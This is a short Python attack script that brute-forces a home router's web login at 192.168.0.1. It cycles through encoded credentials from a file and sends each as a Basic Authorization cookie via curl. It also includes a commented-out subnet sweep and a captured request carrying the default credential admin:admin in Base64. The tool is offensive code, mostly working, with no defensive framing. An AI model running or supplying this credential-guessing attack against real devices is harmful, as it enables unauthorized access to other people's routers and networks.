import os
import sys
import requests
import threading

#for x in range(0,255):
   # req = 'http://'+ '192.168.'+str(x)+'.'+str(y)
   # print(os.system(f'wget --connect-timeout 2 -t 1 -S {req} -O index{x}{y}.html'))


url = "http://192.168.0.1"
res = requests.get(url)
status = 200
if res.status_code == status:
   print('200 OK '+ url)
   with open('encodedcreds.txt','r') as readerCreds:
      for line in readerCreds.readlines():
         cred = line.strip('\n')
         print("[+] Trying with "+cred)
         os.system(f"curl -v --cookie 'Authorization=Basic {cred}' http://192.168.0.1 > response.html")
         with open('response.html', 'r') as reader:
            htmlresp = reader.readlines()
            print(htmlresp)
            if 'Base64Encoding' in htmlresp:
               continue
            else:
               print(f"SUCCESS"+'USERNAME&PASSWORD'+str({cred}))
               exit(0)










'''curl -i -s -k -X $'GET' \
    -H $'Host: 192.168.0.1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.0.1/' -H $'Connection: close' -H $'Cookie: Authorization=Basic YWRtaW46YWRtaW4=' -H $'Upgrade-Insecure-Requests: 1' -H $'Cache-Control: max-age=0' \
    -b $'Authorization=Basic YWRtaW46YWRtaW4=' \
    $'http://192.168.0.1/'



'''



#resHTML = res.textYWRtaW46YWRtaW4=
#os.system('touch sourcecode.txt')
#with open('sourcecode.txt','w') as reader:
#   reader.write(resHTML)
#print(resHTML)
#os.remove('sourcecode.txt')